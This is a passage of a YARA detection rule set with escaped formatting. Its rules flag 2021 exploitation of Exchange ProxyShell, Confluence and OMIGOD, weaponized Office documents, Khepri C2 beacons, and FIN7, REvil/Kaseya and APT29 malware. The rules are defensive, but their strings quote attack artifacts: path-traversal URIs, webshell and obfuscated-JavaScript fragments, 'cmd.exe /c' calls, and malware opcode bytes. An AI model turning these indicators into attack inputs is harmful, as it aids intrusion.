   customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_40539, DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/ServletApi/../RestApi/LogonCustomization\" ascii wide\n      $x2 = \"/ServletApi/../RestAPI/Connection\" ascii wide\n   condition: \n      filesize < 50MB and 1 of them\n}\n\nrule EXPL_MAL_MalDoc_OBFUSCT_MHTML_Sep21_1_RID32E2 : CVE_2021_40444 DEMO EXPLOIT MAL OBFUS OFFICE {\n   meta:\n      description = \"Detects suspicious office reference files including an obfuscated MHTML reference exploiting CVE-2021-40444\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/decalage2/status/1438946225190014984?s=20\"\n      date = \"2021-09-18 14:24:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_40444, DEMO, EXPLOIT, MAL, OBFUS, OFFICE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" ascii wide\n      $s1 = \"109;&#104;&#116;&#109;&#108;&#58;&#104;&#116;&#109;&#108\" ascii wide\n   condition: \n      filesize < 25KB and all of them\n}\n\nrule SUSP_OBFUSC_Indiators_XML_OfficeDoc_Sep21_1_RID3614 : DEMO OBFUS OFFICE SUSP T1027 T1203 T1566_001 {\n   meta:\n      description = \"Detects suspicious encodings in fields used in reference files found in weaponized MS Office documents\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2021-09-18 16:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, OBFUS, OFFICE, SUSP, T1027, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" ascii wide\n      $xml_e = \"Target=\\\"&#\" ascii wide\n      $xml_mode_1 = \"TargetMode=\\\"&#\" ascii wide\n   condition: \n      filesize < 500KB and $h1 and 1 of ( $xml* )\n}\n\nrule SUSP_OBFUSC_Indiators_XML_OfficeDoc_Sep21_2_RID3615 : CVE DEMO OBFUS OFFICE SUSP T1027 T1203 T1566_001 Windows {\n   meta:\n      description = \"Detects suspicious encodings in fields used in reference files found in weaponized MS Office documents\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/sudosev/status/1439205606129377282\"\n      date = \"2021-09-18 16:40:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE, DEMO, OBFUS, OFFICE, SUSP, T1027, T1203, T1566_001, Windows\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" ascii wide\n      $a1 = \"Target\" ascii wide\n      $a2 = \"TargetMode\" ascii wide\n      $xml_e = \"&#x0000\" ascii wide\n   condition: \n      filesize < 500KB and all of them\n}\n\nrule VULN_LNX_OMI_RCE_CVE_2021_386471_Sep21_RID320B : CVE_2021_38647 CVE_2021_386471 DEMO FILE LINUX VULN {\n   meta:\n      description = \"Detects a Linux OMI version vulnerable to CVE-2021-38647 (OMIGOD) which enables an unauthenticated RCE\"\n      author = \"Christian Burkard\"\n      reference = \"https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution\"\n      date = \"2021-09-16 13:48:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_38647, CVE_2021_386471, DEMO, FILE, LINUX, VULN\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $a1 = \"/opt/omi/bin/omiagent\" ascii fullword\n      $s1 = \"OMI-1.6.8-0 - \" ascii\n      $s2 = \"OMI-1.6.6-0 - \" ascii\n      $s3 = \"OMI-1.6.4-1 - \" ascii\n      $s4 = \"OMI-1.6.4-0 - \" ascii\n      $s5 = \"OMI-1.6.2-0 - \" ascii\n      $s6 = \"OMI-1.6.1-0 - \" ascii\n      $s7 = \"OMI-1.5.0-0 - \" ascii\n      $s8 = \"OMI-1.4.4-0 - \" ascii\n      $s9 = \"OMI-1.4.3-2 - \" ascii\n      $s10 = \"OMI-1.4.3-1 - \" ascii\n      $s11 = \"OMI-1.4.3-0 - \" ascii\n      $s12 = \"OMI-1.4.2-5 - \" ascii\n      $s13 = \"OMI-1.4.2-4 - \" ascii\n      $s14 = \"OMI-1.4.2-3 - \" ascii\n      $s15 = \"OMI-1.4.2-2 - \" ascii\n      $s16 = \"OMI-1.4.2-1 - \" ascii\n      $s17 = \"OMI-1.4.1-1 - \" ascii\n      $s18 = \"OMI-1.4.1-0 - \" ascii\n      $s19 = \"OMI-1.4.0-6 - \" ascii\n   condition: \n      uint32be ( 0 ) == 0x7f454c46 and $a1 and 1 of ( $s* )\n}\n\nrule HKTL_Khepri_Beacon_Sep21_1_RID3027 : COBALTSTRIKE DEMO EXE HKTL T1105 {\n   meta:\n      description = \"Detects Khepri C2 framework beacons\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/geemion/Khepri/\"\n      date = \"2021-09-08 12:27:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"86c48679db5f4c085fd741ebec5235bc6cf0cdf8ef2d98fd8a689ceb5088f431\"\n      tags = \"COBALTSTRIKE, DEMO, EXE, HKTL, T1105\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"NT %d.%d Build %d  ProductType:%s\" ascii fullword\n      $xe1 = \"YzIuQ01EUEFSQU0uY21k\" ascii\n      $xe2 = \"MyLkNNRFBBUkFNLmNtZ\" ascii\n      $xe3 = \"jMi5DTURQQVJBTS5jbW\" ascii\n      $sx1 = \"c2.ProcessItem.user\" ascii fullword\n      $sx2 = \"c2.CMDPARAM.cmd\" ascii fullword\n      $sx3 = \"c2.DownLoadFile.file_path\" ascii fullword\n      $sa1 = \"file size zero\" \n      $sa2 = \"cmd.exe /c \" \n      $sa3 = \"error parse param\" \n      $sa4 = \"innet_ip\" \n      $op1 = { c3 b9 b4 98 49 00 87 01 5d c3 b8 b8 98 49 00 c3 8b ff } \n      $op2 = { 8b f1 80 3d 58 97 49 00 00 0f 85 96 00 00 00 33 c0 40 b9 50 97 49 00 87 01 33 db } \n      $op3 = { 90 d5 0c 43 00 34 0d 43 00 ea 0c 43 00 7e 0d 43 00 b6 0d 43 00 cc } \n      $op4 = { 69 c0 ff 00 00 00 8b 4d c0 23 88 40 7c 49 00 89 4d c0 8b 45 cc 0b 45 c0 89 45 cc 8b 45 d0 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d or uint32be ( 0 ) == 0x7f454c46 ) and filesize < 2000KB and ( 1 of ( $x* ) or 2 of ( $sx* ) or all of ( $sa* ) or 3 of ( $op* ) ) or ( filesize < 10MB and 1 of ( $xe* ) ) or 5 of them\n}\n\nrule APT_FIN7_MsDoc_Sep21_1_RID2E18 : APT DEMO FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects MalDocs used by FIN7 group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.anomali.com/blog/cybercrime-group-fin7-using-windows-11-alpha-themed-docs-to-drop-javascript-backdoor\"\n      date = \"2021-09-07 10:59:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d60b6a8310373c9b84e6760c24185535\"\n      tags = \"APT, DEMO, FILE, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 00 4A 00 6F 00 68 00 6E 00 0B 00 57 00 31 00 30\n               00 50 00 72 00 6F 00 4F 00 66 00 66 00 31 00 36 } \n      $s1 = \"word_data.bin\" ascii fullword\n      $s2 = \"V:\\\\DOC\\\\For_JS\" ascii\n      $s3 = \"HomeCompany\" ascii\n      $s4 = \"W10ProOff16\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule SUSP_OBFUSC_JS_Sept21_2_RID2E68 : DEMO G0046 OBFUS RUSSIA SUSP T1027 {\n   meta:\n      description = \"Detects JavaScript obfuscation as used in MalDocs by FIN7 group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.anomali.com/blog/cybercrime-group-fin7-using-windows-11-alpha-themed-docs-to-drop-javascript-backdoor\"\n      date = \"2021-09-07 11:13:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, G0046, OBFUS, RUSSIA, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"=new RegExp(String.fromCharCode(\" ascii\n      $s2 = \".charCodeAt(\" ascii\n      $s3 = \".substr(0, \" ascii\n      $s4 = \"var shell = new ActiveXObject(\" ascii\n      $s5 = \"= new Date().getUTCMilliseconds();\" ascii\n      $s6 = \".deleteFile(WScript.ScriptFullName);\" ascii\n   condition: \n      filesize < 6000KB and ( 4 of them )\n}\n\nrule LOG_EXPL_Confluence_RCE_CVE_2021_26084_Sep21_RID34D3 : CVE_2021_26084 DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects exploitation attempts against Confluence servers abusing a RCE reported as CVE-2021-26084\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md\"\n      date = \"2021-09-01 15:47:01\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_26084, DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /isSafeExpression Unsafe clause found in \\['[^\\n]{1,64}\\\\u0027/ ascii wide\n      $xs1 = \"[util.velocity.debug.DebugReferenceInsertionEventHandler] referenceInsert resolving reference [$!queryString]\" \n      $xs2 = \"userName: anonymous | action: createpage-entervariables ognl.ExpressionSyntaxException: Malformed OGNL expression: '\\\\' [ognl.TokenMgrError: Lexical error at line 1\" \n      $sa1 = \"GET /pages/doenterpagevariables.action\" \n      $sb1 = \"%5c%75%30%30%32%37\" \n      $sb2 = \"\\\\u0027\" \n      $sc1 = \" ERROR \" \n      $sc2 = \" | userName: anonymous | action: createpage-entervariables\" \n      $re1 = /\\[confluence\\.plugins\\.synchrony\\.SynchronyContextProvider\\] getContextMap (\\n )?-- url: \\/pages\\/createpage-entervariables\\.action/ \n   condition: \n      1 of ( $x* ) or ( $sa1 and 1 of ( $sb* ) ) or ( all of ( $sc* ) and $re1 )\n}\n\nrule LOG_EXPL_ProxyToken_Exploitation_Aug21_1_RID35DB : CVE_2021_33766 DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects ProxyToken CVE-2021-33766 exploitation attempts on an unpatched system\"\n      author = \"Florian Roth\"\n      reference = \"https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server\"\n      date = \"2021-08-30 16:31:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_33766, DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ss0 = \"POST \" ascii\n      $ss1 = \" 500 0 0\" \n      $sa1 = \"/ecp/\" ascii\n      $sa2 = \"/RulesEditor/InboxRules.svc/NewObject\" ascii\n      $sb1 = \"/ecp/\" ascii\n      $sb2 = \"SecurityToken=\" ascii\n   condition: \n      all of ( $ss* ) and ( all of ( $sa* ) or all of ( $sb* ) )\n}\n\nrule SUSP_WEBSHELL_ASPX_ProxyShell_Exploitation_Aug21_1_RID38F3 : DEMO SUSP T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects an indicator for unknown malicious loaders noticed in August 2021\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/VirITeXplorer/status/1430206853733097473\"\n      date = \"2021-08-25 18:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-05-12\"\n      tags = \"DEMO, SUSP, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \");eval/*asf\" ascii\n   condition: \n      filesize < 600KB and 1 of them\n}\n\nrule SUSP_IIS_Config_ProxyShell_Artifacts_RID34CE : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious virtual directory configured in IIS pointing to a ProgramData folder (as found in attacks against Exchange servers in August 2021)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/rapid-response-microsoft-exchange-servers-still-vulnerable-to-proxyshell-exploit\"\n      date = \"2021-08-25 15:46:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<site name=\" ascii\n      $a2 = \"<sectionGroup name=\\\"system.webServer\\\">\" ascii\n      $s1 = \" physicalPath=\\\"C:\\\\ProgramData\\\\\" ascii\n   condition: \n      filesize < 500KB and all of ( $a* ) and 1 of ( $s* )\n}\n\nrule WEBSHELL_ASPX_ProxyShell_Aug21_3_RID31EC : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects webshells dropped by ProxyShell exploitation based on their file header (must be DER), size and content\"\n      author = \"Max Altgelt\"\n      reference = \"https://twitter.com/gossithedog/status/1429175908905127938?s=12\"\n      date = \"2021-08-23 13:43:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Page Language=\" ascii nocase\n   condition: \n      uint16 ( 0 ) == 0x8230 and filesize < 10KB and $s1\n}\n\nrule EXPL_Exchange_ProxyShell_Failed_Aug21_1_RID3558 : DEMO EXPLOIT SCRIPT {\n   meta:\n      description = \"Detects ProxyShell exploitation attempts in log files\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html\"\n      date = \"2021-08-08 16:09:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-08-09\"\n      tags = \"DEMO, EXPLOIT, SCRIPT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = / \\/autodiscover\\/autodiscover\\.json[^\\n]{1,300}\\/(powershell|mapi\\/nspi|EWS\\/|X-Rps-CAT)[^\\n]{1,400}401 0 0/ nocase ascii\n      $xr3 = /Email=autodiscover\\/autodiscover\\.json[^\\n]{1,400}401 0 0/ nocase ascii\n   condition: \n      1 of them\n}\n\nrule EXPL_Exchange_ProxyShell_Successful_Aug21_1_RID3733 : DEMO EXPLOIT SCRIPT {\n   meta:\n      description = \"Detects successful ProxyShell exploitation attempts in log files\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html\"\n      date = \"2021-08-08 17:28:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      tags = \"DEMO, EXPLOIT, SCRIPT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1a = / \\/autodiscover\\/autodiscover\\.json[^\\n]{1,300}\\/(powershell|X-Rps-CAT)/ nocase ascii\n      $xr1b = / \\/autodiscover\\/autodiscover\\.json[^\\n]{1,300}\\/(mapi\\/nspi|EWS\\/)[^\\n]{1,400}(200|302) 0 0/ \n      $xr2 = /autodiscover\\/autodiscover\\.json[^\\n]{1,60}&X-Rps-CAT=/ nocase ascii\n      $xr3 = /Email=autodiscover\\/autodiscover\\.json[^\\n]{1,400}200 0 0/ nocase ascii\n   condition: \n      1 of them\n}\n\nrule VULN_PrinterDriver_PrivEsc_CVE_2021_3438_Jul21_RID369F : CVE_2021_3438 DEMO EXE FILE T1068 VULN {\n   meta:\n      description = \"Detects affected drivers with PE timestamps older than the date of the initial report\"\n      author = \"Florian Roth\"\n      reference = \"https://labs.sentinelone.com/cve-2021-3438-16-years-in-hiding-millions-of-printers-worldwide-vulnerable/\"\n      date = \"2021-07-20 17:03:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7cc9ba2df7b9ea6bb17ee342898edd7f54703b93b6ded6a819e83a7ee9f938b4\"\n      tags = \"CVE_2021_3438, DEMO, EXE, FILE, T1068, VULN\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"This String is from Device Driver@@@@@ !!!\" ascii\n      $s2 = \"\\\\DosDevices\\\\ssportc\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of ( $s* ) and 1613606400 >= pe.timestamp\n}\n\nrule APT_MAL_REvil_Kaseya_Jul21_1_RID30AA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used in the Kaseya supply chain attack\"\n      author = \"Florian Roth\"\n      reference = \"https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b\"\n      date = \"2021-07-02 12:49:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1fe9b489c25bb23b04d9996e8107671edee69bd6f6def2fe7ece38a0fb35f98e\"\n      hash2 = \"aae6e388e774180bc3eb96dad5d5bfefd63d0eb7124d68b6991701936801f1c7\"\n      hash3 = \"dc6b0e8c1e9c113f0364e1c8370060dee3fcbe25b667ddeca7623a95cd21411f\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"Mpsvc.dll\" wide fullword\n      $s2 = \":0:4:8:<:@:D:H:L:P:T:X:\\\\:`:d:h:l:p:t:x:H<L<P<\\\\<`<\" ascii fullword\n      $op1 = { 40 87 01 c3 6a 08 68 f8 0e 41 00 e8 ae db ff ff be 80 25 41 00 39 35 ?? 32 41 00 } \n      $op2 = { 8b 40 04 2b c2 c1 f8 02 3b c8 0f 84 56 ff ff ff 68 15 50 40 00 2b c1 6a 04 } \n      $op3 = { 74 73 db e2 e8 ad 07 00 00 68 60 1a 40 00 e8 8f 04 00 00 e8 3a 05 00 00 50 e8 25 26 00 00 } \n      $op4 = { 75 05 8b 45 fc eb 4c c7 45 f8 00 00 00 00 6a 00 8d 45 f0 50 8b 4d 0c } \n      $op5 = { 83 7d 0c 00 75 05 8b 45 fc eb 76 6a 00 68 80 00 00 00 6a 01 6a 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"c36dcd2277c4a707a1a645d0f727542a\" or 2 of them )\n}\n\nrule APT_MAL_REvil_Kaseya_Jul21_2_RID30AB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used in the Kaseya supply chain attack\"\n      author = \"Florian Roth\"\n      reference = \"https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b\"\n      date = \"2021-07-02 12:49:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0496ca57e387b10dfdac809de8a4e039f68e8d66535d5d19ec76d39f7d0a4402\"\n      hash2 = \"8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd\"\n      hash3 = \"cc0cdc6a3d843e22c98170713abf1d6ae06e8b5e34ed06ac3159adafe85e3bd6\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $opa1 = { 8b 4d fc 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 8b 4d 08 } \n      $opa2 = { 89 45 f0 8b 4d fc 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 } \n      $opa3 = { 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 8b 4d 08 0f b6 14 01 } \n      $opa4 = { 89 45 f4 8b 0d ?? ?0 07 10 89 4d f8 8b 15 ?? ?1 07 10 89 55 fc ff 75 fc ff 75 f8 ff 55 f4 } \n      $opb1 = { 18 00 10 bd 18 00 10 bd 18 00 10 0e 19 00 10 cc cc cc } \n      $opb2 = { 18 00 10 0e 19 00 10 cc cc cc cc 8b 44 24 04 } \n      $opb3 = { 10 c4 18 00 10 bd 18 00 10 bd 18 00 10 0e 19 00 10 cc cc } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 2 of ( $opa* ) or 3 of them )\n}\n\nrule APT_APT29_NOBELIUM_JS_EnvyScout_May21_1_RID33E3 : APT DEMO G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects EnvyScout deobfuscator code as used by NOBELIUM group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 15:07:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0016, G0118, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[i].charCodeAt(0) ^ 2);}\" \n   condition: \n      filesize < 5000KB and 1 of them\n}\n\nrule APT_APT29_NOBELIUM_JS_EnvyScout_May21_2_RID33E4 : APT DEMO G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects EnvyScout deobfuscator code as used by NOBELIUM group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 15:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0016, G0118, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"saveAs(blob, \" ascii\n      $s2 = \".iso\\\");\" ascii\n      $s3 = \"application/x-cd-image\" ascii\n      $s4 = \".indexOf(\\\"Win\\\")!=-1\" ascii\n   condition: \n      filesize < 5000KB and all of them\n}\n\nrule APT_APT29_NOBELIUM_LNK_NV_Link_May21_2_RID330D : APT DEMO G0016 G0118 RUSSIA T1547_009 {\n   meta:\n      description = \"Detects NV Link as used by NOBELIUM group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 14:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0016, G0118, RUSSIA, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RegisterOCX BOOM\" ascii wide\n      $s2 = \"cmd.exe /c start BOOM.exe\" ascii wide\n   condition: \n      filesize < 5000KB and 1 of them\n}\n\nrule APT_APT29_NOBELIUM_BoomBox_May21_2_RID31EE : APT DEMO EXE G0016 G0118 RUSSIA T1218_011 {\n   meta:\n      description = \"Detects BoomBox malware used by APT29 / NOBELIUM\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 13:43:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0acb884f2f4cfa75b726cb8290b20328c8ddbcd49f95a1d761b7d131b95bafec\"\n      hash2 = \"8199f309478e8ed3f03f75e7574a3e9bce09b4423bd7eb08bb5bff03af2b7c27\"\n      hash3 = \"cf1d992f776421f72eabc31d5afc2f2067ae856f1c9c1d6dc643a67cb9349d8c\"\n      tags = \"APT, DEMO, EXE, G0016, G0118, RUSSIA, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Microsoft\\\\NativeCache\\\\NativeCacheSvc.dll\" wide\n      $x2 = \"\\\\NativeCacheSvc.dll _configNativeCache\" wide\n      $a1 = \"/content.dropboxapi.com\" wide fullword\n      $s1 = \"rundll32.exe {0} {1}\" wide fullword\n      $s2 = \"\\\\\\\\CertPKIProvider.dll\" wide\n      $s3 = \"/tmp/readme.pdf\" wide\n      $s4 = \"temp/[^\\\"]*)\\\"\" wide fullword\n      $op1 = { 00 78 00 2d 00 41 00 50 00 49 00 2d 00 41 00 72 00 67 00 01 2f 4f 00 72 00 } \n      $op2 = { 25 72 98 01 00 70 6f 34 00 00 0a 25 6f 35 00 00 0a 72 71 02 00 70 72 } \n      $op3 = { 4d 05 20 00 12 80 91 04 20 01 08 0e 04 20 00 12 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 3 of them or 4 of them\n}\n\nrule APT_APT29_NOBELIUM_Malware_May21_2_RID3201 : APT DEMO G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects malware used by APT29 / NOBELIUM\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 13:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"292e5b0a12fea4ff3fc02e1f98b7a370f88152ce71fe62670dd2f5edfaab2ff8\"\n      hash2 = \"776014a63bf3cc7034bd5b6a9c36c75a930b59182fe232535bb7a305e539967b\"\n      tags = \"APT, DEMO, G0016, G0118, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 48 03 c8 42 0f b6 04 21 88 03 0f b6 43 01 8b c8 83 e0 0f 48 83 e1 f0 48 03 c8 } \n      $op2 = { 48 03 c8 42 0f b6 04 21 88 43 01 41 0f b6 c7 8b c8 83 e0 0f 48 83 e1 f0 48 03 c8 } \n      $op3 = { 45 0f b6 43 ff 41 8b c2 99 44 88 03 41 0f b6 2b 83 e2 03 03 c2 40 88 6b 01 } \n   condition: \n      filesize < 2200KB and all of them\n}\n\nrule APT_APT29_NOBELIUM_Malware_May21_3_RID3202 : APT DEMO G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects malware used by APT29 / NOBELIUM\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 13:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2a352380d61e89c89f03f4008044241a38751284995d000c73acf9cad38b989e\"\n      tags = \"APT, DEMO, G0016, G0118, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Win32Project1.dll\" ascii fullword\n      $op1 = { 59 c3 6a 08 68 70 5e 01 10 e8 d2 8c ff ff 8b 7d 08 8b c7 c1 f8 05 } \n      $op2 = { 8d 4d f0 e8 c4 12 00 00 68 64 5b 01 10 8d 45 f0 c7 45 f0 6c 01 01 10 50 e8 ea 13 00 00 cc } \n      $op4 = { 40 c3 8b 65 e8 e8 a6 86 ff ff cc 6a 0c 68 88 60 01 10 e8 b0 4d ff ff } \n      $xc1 = { 25 73 25 73 00 00 00 00 2F 65 2C 20 00 00 00 00\n               43 00 3A 00 5C 00 77 00 69 00 6E 00 64 00 6F 00\n               77 00 73 00 5C 00 65 00 78 00 70 00 6C 00 6F 00\n               72 00 65 00 72 00 2E 00 65 00 78 00 65 } \n   condition: \n      filesize < 3000KB and ( $xc1 or 3 of them )\n}\n\nrule APT_APT29_NOBELIUM_Malware_May21_4_RID3203 : APT DEMO EXE FILE G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects malware used by APT29 / NOBELIUM\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\"\n      date = \"2021-05-29 13:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3b94cc71c325f9068105b9e7d5c9667b1de2bde85b7abc5b29ff649fd54715c4\"\n      tags = \"APT, DEMO, EXE, FILE, G0016, G0118, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"KM.FileSystem.dll\" ascii fullword\n      $op1 = { 80 3d 50 6b 04 10 00 0f 85 96 00 00 00 33 c0 40 b9 48 6b 04 10 87 01 33 db 89 5d fc } \n      $op2 = { c3 33 c0 b9 7c 6f 04 10 40 87 01 c3 8b ff 55 } \n      $op3 = { 8d 4d f4 e8 53 ff ff ff 68 d0 22 01 10 8d 